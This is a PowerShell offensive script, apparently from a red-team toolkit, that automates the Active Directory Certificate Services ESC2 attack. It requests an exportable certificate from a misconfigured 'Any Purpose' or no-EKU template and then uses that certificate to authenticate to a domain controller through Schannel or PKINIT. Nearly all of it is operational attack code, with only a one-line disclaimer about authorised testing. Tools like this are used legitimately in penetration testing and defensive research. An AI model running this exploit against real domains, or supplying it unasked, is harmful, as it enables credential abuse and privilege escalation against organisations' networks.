<#
.SYNOPSIS
    AD CS ESC2 - Any Purpose / No EKU Template (LOLBAS).
.DESCRIPTION
    Exploits templates with Any Purpose OID or no EKU restrictions.
    The issued certificate can be used for Client Authentication.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Vulnerable certificate template name
.EXAMPLE
    .\Invoke-ESC2.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "AnyPurposeTemplate"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC2 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC2" "Any Purpose / No EKU Template"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Template: $TemplateName (Any Purpose or No EKU)" -ForegroundColor Gray
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

Write-Stage -Number 2 -Name "POSITIONING" -Status 'SKIPPED'

Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -Template $TemplateName `
    -OutFile "$OutputDir\esc2.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc2"
if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [i] Certificate has unrestricted EKU - usable for Client Auth" -ForegroundColor Cyan
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
